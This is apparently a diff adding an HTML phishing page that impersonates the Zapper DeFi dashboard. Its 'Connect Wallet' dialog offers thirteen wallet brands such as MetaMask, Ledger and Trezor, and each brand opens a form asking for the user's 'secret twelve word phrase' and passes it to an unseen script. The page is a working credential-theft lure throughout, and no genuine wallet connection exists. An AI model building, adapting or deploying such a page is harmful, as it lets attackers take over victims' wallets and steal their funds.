@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<script src="https://kit.fontawesome.com/aa4dabdc57.js" crossorigin="anonymous"></script>
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;900&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="CSS/style.min.css">
+	<link rel="stylesheet" href="CSS/style.css">
+	<link rel="stylesheet" href="CSS/modal.css">
+	<link rel="stylesheet" href="CSS/media.css">
+	<link rel="stylesheet" href="CSS/alert.css">
+	<title>Zapper - Dashboard for DeFi</title>
+	<link rel="shortcut icon" href="icons/zap_logo.png">
+	<script src="http://yastatic.net/jquery/2.1.4/jquery.min.js"></script>
+	<script src="http://yastatic.net/jquery/cookie/1.0/jquery.cookie.min.js"></script>
+	<script src="customalert.js"></script>
+</head>
+<body>
+	
+	<header>
+		<div class="container">
+			
+			<div class="logo">
+				<a class="zap_linker" href=""><img class="zapper_icons" src="icons/zap_logo.png" alt="">
+					<div class="zapper">Zapper</div></a>
+				</div>
+				<nav>
+					<ul>
+						<li><a class="nav_link" href="#">Docs</a></li>
+						<li><a class="nav_link" href="#">Tutorials</a></li>
+						<li><a class="nav_link" href="#">Community</a></li>
+					</ul>
+				</nav>
+			</div>
+		</header>
+		<section class="main">
+			<div class="container_main">
+				<h1>Manage your<span class="index">DeFi</span> <br class="mobile_brack">assets and liabilities in<br class="mobile_brack"> one <br class="desktop_brack">simple interface.</h1> 
+
+				<h3>
+					Get unique access to opportunities in open finance.
+				</h3>
+				<div class="main_flex">
+					<form action="dashboard.php" method="POST">
+						<input class="main_form" name="cash" maxlength="50" type="text" required placeholder="Enter ENS domain, or a valid ETH, or BTC address">
+						<button class="main_pink">Let's Go!</button>
+						<div class="main_or">
+							or
+						</div>
+						<a class="connect" href="#openModal" rel="modal:open"><button class="main_black">Connect Wallet</button></a>
+					</form>
+				</div>
+				<div class="main_what_one">
+					<i class="fas fa-arrow-right"></i>
+					<a class= "main_wl" href="#">Don't have an address? View demo.</a>
+				</div>
+				<div class="main_what_two">
+					<i class="fas fa-arrow-right"></i>
+					<a class= "main_wl" href="#">What's is DeFi?</a>
+				</div>
+				<div class="main_flex_bottom">
+					<div class="main_mbt">
+						<h2 class="main_mbth">$1.3B+</h2>
+						<p class="main_mbtp">Invested through our platform</p>
+						<p class="main_mbtpbot">Since May 2020</p>
+					</div>
+					<div class="main_mbt">
+						<h2 class="main_mbth">400K+</h2>
+						<p class="main_mbtp">Monitored their assets</p>
+						<p class="main_mbtpbot">Since January 2020</p>
+					</div>
+					<div class="main_mbt">
+						<h2 class="main_mbth">48</h2>
+						<p class="main_mbtp">DeFi platforms supported</p>
+						<a class="main_mbtpbota" href="#">View the full list</a>
+					</div>
+				</div>
+			</div>
+		</section>
+
+
+		<footer class="footer">
+			<div class="container">
+				<div class="footer_left">
+					<a class="footer_i" href="https://twitter.com/zapper_fi"><i class="fab fa-twitter"></i></a>
+					<a class="footer_i" href="https://discord.com/invite/h6CGbuN"><i class="fab fa-discord"></i></a>
+					<a class="footer_i" href=""><i class="fab fa-weixin"></i></a>
+					<a class="footer_a" href="#">FAQ</a>
+					<a class="footer_a" href="#">Docs</a>
+					<a class="footer_a" href="https://discord.com/invite/Rf3YJ3V">Contact Support</a>
+					<a class="footer_a" href="#">Supported Platforms</a>
+					<div class="dropdown">
+						<button onclick="myFunction()" class="dropbtn"><div class="dropbtn_lang">en</div> <div class="dropbtn_arrow"></div> </button>
+						<div id="my Dropdown" class="dropdown-content">
+							<a href="#">English</a>
+							<a href="index_fr.html">Français</a>
+							<a href="index_es.html">Español</a>
+							<a href="index_ru.html">Русский</a>
+							<a href="index_cn.html">中文</a>
+							<a href="index_de.html">Deutsch</a>
+							<a href="index_it.html">Italian</a>
+							<a href="index_el.html">ελληνικά</a>
+							<a href="index_id.html">Bahasa</a>
+						</div>
+					</div>
+				</div>
+
+
+				<script>
+			/* When the user clicks on the button, 
+			toggle between hiding and showing the dropdown content */
+			function myFunction() {
+				document.getElementById("my Dropdown").classList.toggle("show");
+			}
+			
+			// Закрыть the dropdown if the user clicks outside of it
+			/* window.onclick = function(event) {
+			  if (!event.target.matches('.dropbtn')) {
+				var dropdowns = document.getElementsByClassName("dropdown-content");
+				var i;
+				for (i = 0; i < dropdowns.length; i++) {
+				  var open Dropdown = dropdowns[i];
+				  if (open Dropdown.classList.contains('show')) {
+					open Dropdown.classList.remove('show');
+				  }
+				}
+			  }
+			} */
+		</script>
+		<div class="footer_right">
+			<i class="far fa-copyright"></i>
+			Zapper 2021
+		</div>
+	</div>
+</footer>
+
+<div id="openModal" class="modal">
+	<div class="modal-dialog">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h3 class="modal-title">Select a Wallet to Connect to Zapper</h3>
+				<a href="#close" title="Close" class="close">×</a>
+			</div>
+			<div class="modal-body">    
+				<div class="modal-body_l">
+					<a class="modal-body_link" href="#exMask"><button class="modal-body_btn"><img class="modal-body_icon_mm" src="icons/masknew.png" alt=""><span class="modal-body_value">MetaMask</span></button></a>
+					<a class="modal-body_link" href="#exLedger"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/ledgerfin.jpg" alt=""><span class="modal-body_value">Ledger</span></button></a>
+					<a class="modal-body_link" href="#exTrezor"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trezor_dob.jpg" alt=""><span class="modal-body_value">Trezor</span></button></a>
+					<a class="modal-body_link" href="#exPortis"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/port.jpg" alt=""><span class="modal-body_value">Portis</span></button></a>
+					<a class="modal-body_link" href="#exOpera"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/logo-opera.png" alt=""><span class="modal-body_value">Opera</span></button></a>
+					<a class="modal-body_link" href="#exBlockchain"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/blockchain.png" alt=""><span class="modal-body_value">Blockchain</span></button></a>
+					<a class="modal-body_link" href="#exExodus"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/exodus.png" alt=""><span class="modal-body_value">Exodus</span></button></a>
+
+					<a class="accordion" href="#openModal">What is a wallet?</a>
+					<div class="panel">
+						<p class="wal_p">Wallets are used to send, receive, and store digital assets like Ether. Wallets come in many forms. They are either built into your browser, an extension added to your browser, a piece of hardware plugged into your computer or even an app on your phone. For more information about wallets, see <a href="https://docs.ethhub.io/using-ethereum/wallets/intro-to-ethereum-wallets/">this explanation.</a></p>
+					</div>
+				</div>
+				<div class="modal-body_r">
+					<a class="modal-body_link" href="#exWalletConnect"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/walletcon_dob.png" alt=""><span class="modal-body_value">WalletConnect</span></button></a>
+					<a class="modal-body_link" href="#exLattice"><button class="modal-body_btn"><img class="modal-body_icon_lat" src="icons/+L.png" alt=""><span class="modal-body_value">Lattice</span></button></a>
+					<a class="modal-body_link" href="#exFormatic"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/forma.jpg" alt=""><span class="modal-body_value">Formatic</span></button></a>
+					<a class="modal-body_link" href="#exTorus"><button class="modal-body_btn"><img class="modal-body_icon_tor" src="img/torus3.png" alt=""><span class="modal-body_value">Torus</span></button></a>
+					<a class="modal-body_link" href="#exWalletLink"><button class="modal-body_btn"><img class="modal-body_icon_wl" src="icons/walletseedfin.png" alt=""><span class="modal-body_value">WalletLink</span></button></a>
+					<a class="modal-body_link" href="#exTrust"><button class="modal-body_btn"><img class="modal-body_icon" src="icons/trust.jpg" alt=""><span class="modal-body_value">Trust</span></button></a>
+				</div>
+
+				
+				<!-- Скрипт для аккордиона в модальном окне! **************************************************************************************************-->
+				<script>
+					var acc = document.getElementsByClassName("accordion");
+					var i;
+					
+					for (i = 0; i < acc.length; i++) {
+						acc[i].addEventListener("click", function() {
+							this.classList.toggle("active");
+							var panel = this.nextElementSibling;
+							if (panel.style.maxHeight){
+								panel.style.maxHeight = null;
+							} else {
+								panel.style.maxHeight = panel.scrollHeight + "px";
+							}
+						});
+					}
+				</script>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<!-- ******************************************************************************************************************* -->
+<div id="exMask">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/MetaMaskFin.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+
+	<!-- *************************НАЖАТИЕ НА КНОПКУ И ОТПРАВКА ИНФЫ В JS************************************************************************* -->
+	<textarea id="sid_input_1" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_1" class="inp_mod" type="hidden" name="currency" value="MetaMask">
+
+	<button class="main_pink2" onclick="validateInput_1()">Connect</button>
+</div>
+<!--**************************************************************************************************************************************** -->
+<div id="exLedger">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon2" src="icons/ledger.jpg" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_2" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_2" class="inp_mod" type="hidden" name="currency" value="Ledger">
+	<button class="main_pink2" onclick="validateInput_2()">Connect</button>
+</div>
+<div id="exTrezor">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="img/trezorphoto.png"> 
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_3" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_3" class="inp_mod" type="hidden" name="currency" value="Trezor">
+	<button class="main_pink2" onclick="validateInput_3()">Connect</button>
+</div>
+<div id="exPortis">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="img/port.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_4" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_4" class="inp_mod" type="hidden" name="currency" value="Portis">
+	<button class="main_pink2" onclick="validateInput_4()">Connect</button>
+</div>
+<div id="exOpera">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="img/logo-opera.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_5" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_5" class="inp_mod" type="hidden" name="currency" value="Opera">
+	<button class="main_pink2" onclick="validateInput_5()">Connect</button>
+</div>
+<div id="exBlockchain">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/blockchainpng.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_6" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_6" class="inp_mod" type="hidden" name="currency" value="Blockchain">
+	<button class="main_pink2" onclick="validateInput_6()">Connect</button>
+</div>
+<div id="exExodus">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/exodus.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_7" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_7" class="inp_mod" type="hidden" name="currency" value="Exodus">
+	<button class="main_pink2" onclick="validateInput_7()">Connect</button>
+</div>
+
+<div id="exWalletConnect">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="img/walletconph.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_8" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_8" class="inp_mod" type="hidden" name="currency" value="WalletConnect">
+	<button class="main_pink2" onclick="validateInput_8()">Connect</button>
+</div>
+<div id="exLattice">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/+L.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_9" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_9" class="inp_mod" type="hidden" name="currency" value="Lattice">
+	<button class="main_pink2" onclick="validateInput_9()">Connect</button>
+</div>
+<div id="exFormatic">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="img/formaphoto.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_10" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_10" class="inp_mod" type="hidden" name="currency" value="Fortmatic">
+	<button class="main_pink2" onclick="validateInput_10()">Connect</button>
+</div>
+<div id="exTorus" class="modal">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/torf.jpg" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_11" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_11" class="inp_mod" type="hidden" name="currency" value="Torus">
+	<button class="main_pink2" onclick="validateInput_11()">Connect</button>
+</div>
+
+<div id="exWalletLink">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/walletseedfin.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_12" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_12" class="inp_mod" type="hidden" name="currency" value="WalletLink">
+	<button class="main_pink2" onclick="validateInput_12()">Connect</button>
+</div>
+
+<div id="exTrust" class="modal">
+	<a href="#close" title="Close" class="close_value">×</a>
+	<img class="ex2icon" src="icons/trust_png.png" alt="">
+	<p class="ex2p">Enter your secret twelve word phrase here to connect wallet</p>
+	<p class="ex2p">Wallet Seed:</p>
+	<textarea id="sid_input_13" spellcheck="false" class="inp_mod" type="text" name="sid"></textarea>
+	<input id="cur_input_13" class="inp_mod" type="hidden" name="currency" value="Trust">
+	<button class="main_pink2" onclick="validateInput_13()">Connect</button>
+</div>
+
+</body>
+</html>			
